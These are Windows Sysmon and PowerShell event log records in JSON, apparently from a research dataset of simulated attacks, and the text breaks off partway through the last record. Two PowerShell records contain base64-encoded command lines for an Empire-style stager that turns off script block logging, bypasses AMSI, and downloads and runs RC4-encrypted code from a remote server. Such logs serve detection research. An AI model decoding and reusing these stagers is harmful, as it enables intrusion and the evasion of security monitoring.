{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "Pedro01", "TimeCreated": "2022-08-08T01:39:47.031Z", "@timestamp": "2022-08-08T01:39:47.031Z", "EventID": 10, "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2022-08-08 20:39:47.016\r\nSourceProcessGUID: {625b42a0-6b36-62e9-1b00-000000000900}\r\nSourceProcessId: 1048\r\nSourceThreadId: 1244\r\nSourceImage: C:\\Windows\\System32\\VBoxService.exe\r\nTargetProcessGUID: {625b42a0-7476-62f1-2306-000000000900}\r\nTargetProcessId: 864\r\nTargetImage: C:\\Windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1400\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\System32\\KERNELBASE.dll+2730e|C:\\Windows\\System32\\VBoxService.exe+13357|C:\\Windows\\System32\\VBoxService.exe+145ff|C:\\Windows\\System32\\VBoxService.exe+1487e|C:\\Windows\\System32\\VBoxService.exe+102bb|C:\\Windows\\System32\\VBoxService.exe+10dc0|C:\\Windows\\System32\\VBoxService.exe+17ee|C:\\Windows\\System32\\VBoxService.exe+3234f|C:\\Windows\\System32\\VBoxService.exe+35f1c|C:\\Windows\\System32\\VBoxService.exe+103663|C:\\Windows\\System32\\VBoxService.exe+1036f7|C:\\Windows\\System32\\KERNEL32.DLL+17944|C:\\Windows\\SYSTEM32\\ntdll.dll+6ce71\r\nSourceUser: NT AUTHORITY\\SYSTEM\r\nTargetUser: NT AUTHORITY\\SYSTEM", "Task": "10", "RuleName": "-", "UtcTime": "2022-08-08 20:39:47.016", "SourceProcessGUID": "{625b42a0-6b36-62e9-1b00-000000000900}", "SourceProcessId": "1048", "SourceThreadId": "1244", "SourceImage": "C:\\Windows\\System32\\VBoxService.exe", "TargetProcessGUID": "{625b42a0-7476-62f1-2306-000000000900}", "TargetProcessId": "864", "TargetImage": "C:\\Windows\\System32\\svchost.exe", "GrantedAccess": "0x1400", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\System32\\KERNELBASE.dll+2730e|C:\\Windows\\System32\\VBoxService.exe+13357|C:\\Windows\\System32\\VBoxService.exe+145ff|C:\\Windows\\System32\\VBoxService.exe+1487e|C:\\Windows\\System32\\VBoxService.exe+102bb|C:\\Windows\\System32\\VBoxService.exe+10dc0|C:\\Windows\\System32\\VBoxService.exe+17ee|C:\\Windows\\System32\\VBoxService.exe+3234f|C:\\Windows\\System32\\VBoxService.exe+35f1c|C:\\Windows\\System32\\VBoxService.exe+103663|C:\\Windows\\System32\\VBoxService.exe+1036f7|C:\\Windows\\System32\\KERNEL32.DLL+17944|C:\\Windows\\SYSTEM32\\ntdll.dll+6ce71", "SourceUser": "NT AUTHORITY\\SYSTEM", "TargetUser": "NT AUTHORITY\\SYSTEM"}
{"Channel": "Microsoft-Windows-Sysmon/Operational", "Domain": "NT AUTHORITY", "RecordNumber": 884112, "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "SeverityValue": 2, "TargetObject": "HKU\\.DEFAULT\\Software\\Microsoft\\SystemCertificates\\Disallowed\\CRLs", "ProcessGuid": "{00bb3ee6-d7a3-5f80-ae06-000000000400}", "Hostname": "MORDORDC.theshire.local", "ExecutionProcessID": 3956, "Message": "Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2020-10-09 21:35:33.830\r\nProcessGuid: {00bb3ee6-d7a3-5f80-ae06-000000000400}\r\nProcessId: 5852\r\nImage: C:\\windows\\system32\\wbem\\wmiprvse.exe\r\nTargetObject: HKU\\.DEFAULT\\Software\\Microsoft\\SystemCertificates\\Disallowed\\CRLs", "ProcessId": "5852", "RuleName": "-", "SourceName": "Microsoft-Windows-Sysmon", "SourceModuleName": "eventlog", "Task": 12, "EventTypeOrignal": "INFO", "EventTime": "2020-10-09 17:35:33", "UserID": "S-1-5-18", "@timestamp": "2020-10-09T21:35:41.738Z", "Severity": "INFO", "host": "wec.internal.cloudapp.net", "port": 58623, "Category": "Registry object added or deleted (rule: RegistryEvent)", "EventReceivedTime": "2020-10-09 17:35:41", "tags": ["mordorDataset"], "ThreadID": 4256, "Version": 2, "OpcodeValue": 0, "Image": "C:\\windows\\system32\\wbem\\wmiprvse.exe", "@version": "1", "EventType": "CreateKey", "Keywords": -9223372036854775808, "Opcode": "Info", "EventID": 12, "AccountName": "SYSTEM", "AccountType": "User", "UtcTime": "2020-10-09 21:35:33.830", "SourceModuleType": "im_msvistalog"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "Pedro01", "TimeCreated": "2022-08-04T08:36:22.595Z", "@timestamp": "2022-08-04T08:36:22.595Z", "EventID": 12, "Message": "Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2022-08-04 15:36:22.510\r\nProcessGuid: {625b42a0-411f-62e9-6200-000000000900}\r\nProcessId: 4072\r\nImage: C:\\Windows\\Explorer.EXE\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\r\nUser: PEDRO01\\IT01-Pedro", "Task": "12", "RuleName": "-", "EventType": "CreateKey", "UtcTime": "2022-08-04 15:36:22.510", "ProcessGuid": "{625b42a0-411f-62e9-6200-000000000900}", "ProcessId": "4072", "Image": "C:\\Windows\\Explorer.EXE", "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates", "User": "PEDRO01\\IT01-Pedro"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "Pedro01", "TimeCreated": "2022-08-08T01:40:02.324Z", "@timestamp": "2022-08-08T01:40:02.324Z", "EventID": 12, "Message": "Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2022-08-08 20:40:02.313\r\nProcessGuid: {625b42a0-749b-62f1-2a06-000000000900}\r\nProcessId: 7184\r\nImage: C:\\Windows\\system32\\backgroundTaskHost.exe\r\nTargetObject: \\REGISTRY\\A\\{0cd6200d-8a7d-e473-ba4f-e63b99e55953}\\LocalState\r\nUser: PEDRO01\\IT01-Pedro", "Task": "12", "RuleName": "-", "EventType": "CreateKey", "UtcTime": "2022-08-08 20:40:02.313", "ProcessGuid": "{625b42a0-749b-62f1-2a06-000000000900}", "ProcessId": "7184", "Image": "C:\\Windows\\system32\\backgroundTaskHost.exe", "TargetObject": "\\REGISTRY\\A\\{0cd6200d-8a7d-e473-ba4f-e63b99e55953}\\LocalState", "User": "PEDRO01\\IT01-Pedro"}
{"Keywords": -9223372036854775808, "SeverityValue": 2, "TargetObject": "HKU\\.DEFAULT\\Software\\Microsoft\\SystemCertificates\\Disallowed", "EventTypeOrignal": "INFO", "EventID": 12, "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "ExecutionProcessID": 3392, "host": "wec.internal.cloudapp.net", "Channel": "Microsoft-Windows-Sysmon/Operational", "UserID": "S-1-5-18", "AccountType": "User", "ThreadID": 5552, "ProcessGuid": "{d273d0f0-e865-5f64-0c00-000000000800}", "EventReceivedTime": "2020-09-18 13:08:55", "Opcode": "Info", "EventTime": "2020-09-18 13:06:59", "@timestamp": "2020-09-18T17:08:55.653Z", "SourceModuleType": "im_msvistalog", "port": 64545, "AccountName": "SYSTEM", "RecordNumber": 1722958, "Task": 12, "Domain": "NT AUTHORITY", "@version": "1", "OpcodeValue": 0, "SourceModuleName": "eventlog", "Severity": "INFO", "SourceName": "Microsoft-Windows-Sysmon", "Version": 2, "Image": "C:\\windows\\system32\\WerFault.exe", "Category": "Registry object added or deleted (rule: RegistryEvent)", "UtcTime": "2020-09-18 17:06:59.567", "Hostname": "WORKSTATION6.theshire.local", "RuleName": "-", "tags": ["mordorDataset"]}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "pedro-computer", "TimeCreated": "2022-08-18T05:34:25.286Z", "@timestamp": "2022-08-18T05:34:25.286Z", "EventID": 12, "Message": "Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2022-08-19 00:34:25.258\r\nProcessGuid: {564ff025-a9dc-62fe-1100-000000000700}\r\nProcessId: 824\r\nImage: C:\\Windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft", "Task": "12", "RuleName": "-", "EventType": "CreateKey", "UtcTime": "2022-08-19 00:34:25.258", "ProcessGuid": "{564ff025-a9dc-62fe-1100-000000000700}", "ProcessId": "824", "Image": "C:\\Windows\\system32\\svchost.exe", "TargetObject": "HKLM\\SOFTWARE\\Microsoft"}
{"@version": "1", "EventType": "INFO", "ThreadID": 0, "EventTime": "2020-08-07 10:34:54", "Task": 8, "Channel": "Windows PowerShell", "SourceName": "PowerShell", "Opcode": "Info", "Hostname": "WORKSTATION5.theshire.local", "@timestamp": "2020-08-07T14:34:54.945Z", "Message": "Pipeline execution details for command line:             Start-Sleep -Seconds $sleepTime;\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=11089\r\n\r\n\tUserId=THESHIRE\\pgustavo\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=bd39a342-b84b-499d-b35a-752ceae5484c\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAUwBpAE8ATgBUAGEAYgBsAEUALgBQAFMAVgBlAHIAcwBpAE8ATgAuAE0AYQBKAE8AcgAgAC0AZwBFACAAMwApAHsAJAA5ADMAOQA9AFsAUgBFAGYAXQAuAEEAUwBzAEUAbQBiAGwAeQAuAEcAZQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJAA5ADMAOQApAHsAJAA3ADkAMAA9ACQAOQAzADkALgBHAGUAVABWAEEATABVAGUAKAAkAE4AdQBMAEwAKQA7AEkARgAoACQANwA5ADAAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8AbABMAEUAQwB0AGkAbwBOAFMALgBHAEUATgBlAHIASQBjAC4ARABJAEMAdABJAE8AbgBBAHIAWQBbAHMAdAByAEkAbgBnACwAUwBZAFMAdABFAE0ALgBPAEIAagBlAEMAdABdAF0AOgA6AG4AZQB3ACgAKQA7ACQAdgBhAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBhAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAA3ADkAMABbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUAbABTAGUAewBbAFMAQwByAEkAUAB0AEIATABvAGMASwBdAC4AIgBHAGUAdABGAEkAZQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAdQBFACgAJABOAFUATABMACwAKABOAGUAdwAtAE8AQgBKAGUAQwB0ACAAQwBPAEwAbABlAGMAVABpAE8ATgBTAC4ARwBlAG4AZQBSAGkAYwAuAEgAQQBzAEgAUwBFAHQAWwBTAFQAcgBJAG4ARwBdACkAKQB9ACQAUgBFAEYAPQBbAFIAZQBmAF0ALgBBAFMAcwBFAE0AYgBMAFkALgBHAGUAdABUAHkAcABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQAnACsAJwBVAHQAaQBsAHMAJwApADsAJABSAGUARgAuAEcAZQBUAEYASQBlAEwARAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAJwArACcAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAGwAVQBlACgAJABuAHUATABsACwAJAB0AHIAdQBFACkAOwB9ADsAWwBTAFkAUwB0AGUAbQAuAE4AZQBUAC4AUwBlAFIAVgBpAEMARQBQAG8AaQBuAFQATQBhAE4AQQBnAGUAUgBdADoAOgBFAHgAcABlAGMAdAAxADAAMABDAG8ATgBUAEkAbgB1AGUAPQAwADsAJAA1ADUARgA9AE4ARQB3AC0ATwBCAEoARQBjAFQAIABTAFkAcwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAEkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAFQALgBFAG4AQwBPAGQASQBuAGcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVABSAEkATgBHACgAWwBDAE8AbgB2AEUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAFMARQA2ADQAUwBUAFIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADUAZgAuAEgARQBBAEQARQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUANQBGAC4AUABSAE8AeABZAD0AWwBTAHkAUwB0AEUATQAuAE4AZQBUAC4AVwBFAGIAUgBlAFEAdQBFAFMAVABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBPAFgAWQA7ACQANQA1AEYALgBQAFIATwBYAFkALgBDAFIARQBkAEUAbgB0AEkAQQBsAFMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4AZQBUAC4AQwBSAEUAZABFAG4AdABJAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAEYAYQB1AGwAVABOAGUAdAB3AG8AUgBLAEMAUgBFAGQAZQBuAFQASQBBAGwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADUAZgAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAVABFAE0ALgBUAGUAWABUAC4ARQBuAGMATwBEAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQBUAGUAUwAoACcAawApAGcASgAlAHgAMQBeAFMARABVAEcAIQB1AEsAbQA/AEwAdgAqAGIAZQBbAC0AbwBpAHkALwA0AHcAVAB8ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQANQA1AGYALgBIAEUAYQBkAEUAcgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAVgB4AGoAQgBwAEUAdQA9ADUARQBqAEUASQAwAGwARQA1AFcAWAAwAFAAdABSAGEARAAvAEEASwA1AFIATwBQAFYAeABVAD0AIgApADsAJABEAEEAVABBAD0AJAA1ADUAZgAuAEQAbwB3AE4ATABvAEEARABEAGEAVABBACgAJABzAGUAUgArACQAVAApADsAJABJAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAGQAQQB0AGEAPQAkAEQAQQBUAEEAWwA0AC4ALgAkAEQAQQB0AGEALgBsAEUATgBHAHQASABdADsALQBqAE8ASQBuAFsAQwBIAEEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=7c68447b-1740-4e09-9a80-6b8d20ac5a84\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=            Start-Sleep -Seconds $sleepTime;\n \r\n\r\nDetails: \r\nCommandInvocation(Start-Sleep): \"Start-Sleep\"\r\nParameterBinding(Start-Sleep): name=\"Seconds\"; value=\"5\"\r\n", "Category": "Pipeline Execution Details", "SourceModuleName": "eventlog", "EventReceivedTime": "2020-08-07 10:34:54", "port": 60122, "ExecutionProcessID": 0, "host": "wec.internal.cloudapp.net", "Severity": "INFO", "SeverityValue": 2, "EventID": 800, "RecordNumber": 7170, "SourceModuleType": "im_msvistalog", "Keywords": 36028797018963968, "tags": ["mordorDataset"]}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "DESKTOP-CQF82L6", "TimeCreated": "2022-07-05T02:02:32.450Z", "@timestamp": "2022-07-05T02:02:32.450Z", "EventID": 10, "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2022-07-05 21:02:32.436\r\nSourceProcessGUID: {01e2a015-d09b-62bd-2100-000000000700}\r\nSourceProcessId: 1244\r\nSourceThreadId: 1376\r\nSourceImage: C:\\Windows\\System32\\VBoxService.exe\r\nTargetProcessGUID: {01e2a015-d0d7-62bd-8900-000000000700}\r\nTargetProcessId: 4908\r\nTargetImage: C:\\Windows\\system32\\SearchIndexer.exe\r\nGrantedAccess: 0x1400\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d204|C:\\Windows\\System32\\KERNELBASE.dll+2c13e|C:\\Windows\\System32\\VBoxService.exe+13357|C:\\Windows\\System32\\VBoxService.exe+145ff|C:\\Windows\\System32\\VBoxService.exe+1487e|C:\\Windows\\System32\\VBoxService.exe+102bb|C:\\Windows\\System32\\VBoxService.exe+10dc0|C:\\Windows\\System32\\VBoxService.exe+17ee|C:\\Windows\\System32\\VBoxService.exe+3234f|C:\\Windows\\System32\\VBoxService.exe+35f1c|C:\\Windows\\System32\\VBoxService.exe+103663|C:\\Windows\\System32\\VBoxService.exe+1036f7|C:\\Windows\\System32\\KERNEL32.DLL+17034|C:\\Windows\\SYSTEM32\\ntdll.dll+52651\r\nSourceUser: NT AUTHORITY\\SYSTEM\r\nTargetUser: NT AUTHORITY\\SYSTEM", "Task": "10", "RuleName": "-", "UtcTime": "2022-07-05 21:02:32.436", "SourceProcessGUID": "{01e2a015-d09b-62bd-2100-000000000700}", "SourceProcessId": "1244", "SourceThreadId": "1376", "SourceImage": "C:\\Windows\\System32\\VBoxService.exe", "TargetProcessGUID": "{01e2a015-d0d7-62bd-8900-000000000700}", "TargetProcessId": "4908", "TargetImage": "C:\\Windows\\system32\\SearchIndexer.exe", "GrantedAccess": "0x1400", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d204|C:\\Windows\\System32\\KERNELBASE.dll+2c13e|C:\\Windows\\System32\\VBoxService.exe+13357|C:\\Windows\\System32\\VBoxService.exe+145ff|C:\\Windows\\System32\\VBoxService.exe+1487e|C:\\Windows\\System32\\VBoxService.exe+102bb|C:\\Windows\\System32\\VBoxService.exe+10dc0|C:\\Windows\\System32\\VBoxService.exe+17ee|C:\\Windows\\System32\\VBoxService.exe+3234f|C:\\Windows\\System32\\VBoxService.exe+35f1c|C:\\Windows\\System32\\VBoxService.exe+103663|C:\\Windows\\System32\\VBoxService.exe+1036f7|C:\\Windows\\System32\\KERNEL32.DLL+17034|C:\\Windows\\SYSTEM32\\ntdll.dll+52651", "SourceUser": "NT AUTHORITY\\SYSTEM", "TargetUser": "NT AUTHORITY\\SYSTEM"}
{"Keywords": 0, "SeverityValue": 2, "EventReceivedTime": "2020-09-21 23:32:55", "EventID": 4103, "ProviderGuid": "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}", "ExecutionProcessID": 1112, "Channel": "Microsoft-Windows-PowerShell/Operational", "host": "wec.internal.cloudapp.net", "AccountType": "User", "ActivityID": "{3AF69DEC-79B4-0001-2F72-15856290D601}", "UserID": "S-1-5-21-4228717743-1032521047-1810997296-1104", "ThreadID": 2484, "EventType": "INFO", "Opcode": "To be used when operation is just executing a method", "EventTime": "2020-09-21 23:32:52", "@timestamp": "2020-09-22T03:32:55.093Z", "SourceModuleType": "im_msvistalog", "port": 64545, "AccountName": "pgustavo", "RecordNumber": 175673, "Payload": "CommandInvocation(ForEach-Object): \"ForEach-Object\"\r\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"$ba0.Headers.Add($_.Name, $_.Value)\"\r\n", "Task": 106, "Domain": "THESHIRE", "@version": "1", "OpcodeValue": 20, "SourceModuleName": "eventlog", "ERROR_EVT_UNRESOLVED": true, "Severity": "INFO", "ContextInfo": "        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = 83b63fdb-fb11-4ee9-87d9-10dec167c557\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAUwBJAE8ATgAuAE0AYQBKAE8AUgAgAC0AZwBlACAAMwApAHsAJABDADYANwA9AFsAcgBFAEYAXQAuAEEAUwBzAEUAbQBiAEwAWQAuAEcAZQBUAFQAeQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAGkAZQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABDADYANwApAHsAJAA2AEMANAA9ACQAQwA2ADcALgBHAGUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwAKQA7AEkAZgAoACQANgBDADQAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJAA2AGMANABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA2AGMANABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAQQBsAD0AWwBDAE8AbABsAEUAQwB0AGkATwBOAFMALgBHAEUAbgBFAFIAaQBDAC4ARABJAEMAdABpAE8AbgBhAFIAeQBbAHMAVABSAEkAbgBnACwAUwB5AHMAdABlAE0ALgBPAGIASgBlAGMAdABdAF0AOgA6AE4AZQB3ACgAKQA7ACQAdgBBAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBhAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAA2AGMANABbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAEEAbAB9AEUATABzAGUAewBbAFMAYwBSAGkAUAB0AEIATABvAEMASwBdAC4AIgBHAGUAVABGAEkAZQBgAGwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBhAGwAdQBFACgAJABuAFUAbABMACwAKABOAEUAVwAtAE8AQgBqAEUAQwBUACAAQwBPAGwAbABlAGMAdABpAE8ATgBzAC4ARwBFAE4ARQByAGkAQwAuAEgAYQBTAEgAUwBlAFQAWwBTAFQAUgBJAG4ARwBdACkAKQB9ACQAUgBFAEYAPQBbAFIAZQBmAF0ALgBBAFMAUwBFAE0AYgBsAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQAnACsAJwBVAHQAaQBsAHMAJwApADsAJABSAEUARgAuAEcARQB0AEYAaQBlAGwARAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAJwArACcAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAFQAVgBhAGwAdQBFACgAJABOAHUATABMACwAJAB0AHIAVQBFACkAOwB9ADsAWwBTAFkAUwB0AEUATQAuAE4AZQBUAC4AUwBlAHIAVgBpAGMARQBQAE8AaQBuAHQATQBBAG4AYQBnAEUAUgBdADoAOgBFAHgAcABFAEMAVAAxADAAMABDAE8AbgBUAEkATgBVAGUAPQAwADsAJABCAGEAMAA9AE4AZQB3AC0ATwBiAEoAZQBDAHQAIABTAFkAUwBUAGUAbQAuAE4ARQB0AC4AVwBlAGIAQwBMAGkAZQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwA